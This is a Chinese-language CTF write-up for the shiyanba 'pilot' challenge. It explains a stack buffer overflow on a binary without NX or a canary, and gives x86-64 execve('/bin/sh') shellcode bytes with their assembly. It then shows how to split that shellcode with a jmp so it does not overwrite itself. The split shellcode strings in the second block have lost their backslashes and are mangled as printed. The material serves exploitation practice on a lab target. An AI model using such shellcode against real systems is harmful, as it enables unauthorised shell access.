# shiyanba--pwn--pilot

```
	Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

堆栈溢出的题目，主要是学习shellcode的使用

  题目会返回buf的地址

  我们往buf添加shellcode，然后溢出覆盖返回地址为buf的地址，最后就会执行shellcode

```
  -0000000000000020 buf             db ?
  -000000000000001F                 db ? ; undefined
  ...............
  -0000000000000002                 db ? ; undefined
  -0000000000000001                 db ? ; undefined
  +0000000000000000  s              db 8 dup(?)
  +0000000000000008  r              db 8 dup(?)

```

shellcode的制作

1.自带的shellcode生成器

32位:shellcraft.i386.linux.sh()

64位:shellcraft.amd64.linux.sh()

2.通过著名的shell-storm.org的shellcode数据库shell-storm.org/shellcode/

```
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
#xor rdx, rdx
#mov rbx, 0x68732f6e69622f2f
#shr rbx, 0x8
#push rbx
#mov rdi, rsp
#push rax
#push rdi
#mov rsi, rsp
#mov al, 0x3b
#syscall

```

但执行时发生错误

原因是  在push rdi  时 把我们的shellcode给覆盖了

![image](https://raw.githubusercontent.com/lhc328/pwn/master/picture/shiyanba-pilot/1.png)

![image](https://raw.githubusercontent.com/lhc328/pwn/master/picture/shiyanba-pilot/2.png)

![image](https://raw.githubusercontent.com/lhc328/pwn/master/picture/shiyanba-pilot/3.png)

![image](https://raw.githubusercontent.com/lhc328/pwn/master/picture/shiyanba-pilot/4.png)

我们可以找短一点的shellcode，但比较难找

于是我们进行改造shellcode

因为可以打破汇编代码执行的连续性的指令就那么几种，call，ret和跳转。前两条指令都会影响到寄存器和栈的状态，因此我们只能选择使用跳转中的无条件跳转jmp。

栈溢出最多可以向栈中写0x40=64个字节。结合对这个题目的分析可知在返回地址之后还有16个字节的空间可写。根据这四张图显示出来的结果，push rdi执行后下一条指令就会被修改，因此我们可以考虑把shellcode在push rax和push rdi之间分拆成两段，此时push rdi之后的shellcode片段为8个字节，小于16字节，可以容纳。



简单来说，就是把shellcode分为两段，第一段就变小了，push rdi时就不会覆盖到我们的shellcode，跳转指令会跳到第二段shellcode继续执行。

```
#shellcode = "x48x31xd2x48xbbx2fx2fx62x69x6ex2fx73x68x48xc1xebx08x53x48x89xe7x50x57x48x89xe6xb0x3bx0fx05"
#原始的shellcode。由于shellcode位于栈上，运行到push rdi时栈顶正好到了x89xe6xb0x3bx0fx05处，rdi的值会覆盖掉这部分shellcode，从而导致执行失败，所以需要对其进行拆分
#xor rdx, rdx
#mov rbx, 0x68732f6e69622f2f
#shr rbx, 0x8
#push rbx
#mov rdi, rsp
#push rax
#push rdi
#mov rsi, rsp
#mov al, 0x3b
#syscall

shellcode1 = "x48x31xd2x48xbbx2fx2fx62x69x6ex2fx73x68x48xc1xebx08x53x48x89xe7x50"
#第一部分shellcode，长度较短，避免尾部被push rdi污染
#xor rdx, rdx
#mov rbx, 0x68732f6e69622f2f
#shr rbx, 0x8
#push rbx
#mov rdi, rsp
#push rax

shellcode1 += "xebx18"
#使用一个跳转跳过被push rid污染的数据，接上第二部分shellcode继续执行
#jmp short $+18h

shellcode2 = "x57x48x89xe6xb0x3bx0fx05"
#第二部分shellcode
#push rdi
#mov rsi, rsp
#mov al, 0x3b
#syscall

```

